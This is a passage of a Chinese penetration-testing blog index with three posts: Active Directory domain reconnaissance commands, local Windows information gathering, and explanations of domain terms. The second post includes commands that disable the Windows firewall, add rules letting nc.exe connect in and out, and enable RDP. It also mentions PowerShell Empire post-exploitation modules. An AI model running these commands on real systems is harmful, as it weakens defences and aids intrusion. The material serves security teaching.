src="/2022/10/13/Intra-domain_information_collection/1665304170728-669ac8ea-d8ec-4a3b-995a-e2ac68a8f7dc.png" alt="image.png"></p><ul><li>查询域用户详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><ul><li>查询存在的用户，dsquery命令需要在域控上运行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304508449-4870f9b9-de10-4d99-bd8d-f7677255f724.png" alt="image.png"><br>常用的 dsquery 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery group - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304613101-cfb585e7-4e5a-47e2-9135-17b870810511.png" alt="image.png"></p><p><img src="/2022/10/13/Intra-domain_information_collection/1665304745790-12d460b6-132b-4817-aa4d-2846c651bc6e.png" alt="image.png"></p><h3 id="查找域控制器">查找域控制器</h3><ul><li>查看域控器机器名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:fzm.com</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304872563-8496491f-bbdb-41b4-a1a5-4f62692f57dc.png" alt="image.png"></p><ul><li>查看域控器主机名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305173306-40fede56-3fbd-4e66-98de-4492579b3dca.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc   //需要在域控上执行</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304977673-5f9ec9f2-e393-4f94-8d1e-2ab2812e3ac7.png" alt="image.png"></p><ul><li>查看域控器组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305257385-be808558-2986-4b33-87d2-3a15003202ef.png" alt="image.png"></p><h3 id="查找域管理员进程">查找域管理员进程</h3><ul><li>获取域管理员列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665383177494-e4ffdfc1-234e-4f76-bd0f-22ec5f147e6e.png" alt="image.png"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地工作组信息收集</title>
      <link href="/2022/10/12/Working_Group_Information_Gathering/"/>
      <url>/2022/10/12/Working_Group_Information_Gathering/</url>
      
        <content type="html"><![CDATA[<h3 id="手动收集本地工作组信息">手动收集本地工作组信息</h3><ul><li>查看当前权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><ul><li>本机网络配置信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（英文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（中文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><ul><li>查看系统体系结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><ul><li>查看系统所有环境变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><ul><li>查看安装的软件及版本和路径等信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><ul><li>利用 PowerShell 收集软件版本信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><ul><li>查询本机服务信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><ul><li>查询进程列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><ul><li>wmic 查看进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看启动程序信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><ul><li>查看计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><ul><li>查看主机开启时间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><ul><li>查询用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><ul><li>查看指定用户的信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><ul><li>查看本地管理员用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><ul><li>查看当前在线用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><ul><li>列出或断开本地计算机和连接的客户端的会话</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><ul><li>查看端口列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><ul><li>查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li>查看本机共享</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看共享列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><ul><li>查询路由表及所有可用接口的ARP 缓存表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp –a</span><br></pre></td></tr></table></figure><ul><li>查询防火墙相关配置<ul><li>关闭防火墙</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)</span><br><span class="line">netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</span><br></pre></td></tr></table></figure><ul><li>查看防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(Windows Server 2003 系统及之前版本)</span><br><span class="line">允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">(Windows Server 2003 之后系统版本)</span><br><span class="line">允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许 3389 端口放行</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><ul><li>自定义防火墙日志储存位置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log</span><br></pre></td></tr></table></figure><ul><li>查看计算机代理配置情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><ul><li>查询并开启远程连接服务<ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h3 id="自动收集本地工作组信息">自动收集本地工作组信息</h3><ul><li>wmic脚本</li></ul><p><a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic 脚本下载地址</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><ul><li>PowerShsell Empire</li></ul><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</li><li>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</li></ul><p>当使用 Empire 使主机上线后，可调用powershell/situational_awareness/host/winenum模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p>调用powershell/situational_awareness/host/computerdetails模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><div id="posts-calendar" class="js-pjax"></div>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网中常见名词解释</title>
      <link href="/2022/10/11/Explanatio_of_common_terms_in_the_intranet/"/>
      <url>/2022/10/11/Explanatio_of_common_terms_in_the_intranet/</url>
      
        <content type="html"><![CDATA[<h3 id="工作组">工作组</h3><p><strong>工作组</strong> Work Group 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。<br>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。<br>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。<br>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。<br>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h3 id="域-domain">域 domain</h3><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。<br>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller">域控制器 Domain Controller</h3><p>简写为 DC，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。<br>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。<br>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。<br>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域">父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树">域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。<br>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，<a href="http://xn--child-mt3iw1h.Microsoft.com">如域child.Microsoft.com</a> 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。<br>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。<br>多个域树可以组成一个域林。</p><h3 id="域林">域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。<br>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道<strong>Kerberos信任关系</strong>，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.<br><a href="http://xn--benet-gv5ij80i.com.cn">比如benet.com.cn</a>,<a href="http://xn--accp-k84fzc0jl1d32ova062c9jy86gfdifv7a053c.com.cn">则可以创建同属与一个林的accp.com.cn</a>,他们就在同一个域林里.<br>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。<br>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><h3 id="活动目录">活动目录</h3><p>活动目录 Active Directory ，简写为 AD，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。<br>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。<br>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h3 id="DMZ">DMZ</h3><p>DMZ demilitarized zone ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。<br>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><h3 id="域内的各种权限">域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。<br><strong>域本地组</strong><br>成员范围：所有的域；使用范围：自己所在的域<br><strong>全局组</strong><br>成员范围：自己所在的域；使用范围：所有的域<br><strong>通用组</strong><br>成员范围：所有的域；使用范围：所有的域<br><strong>A-G-DL-P 策略</strong><br>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
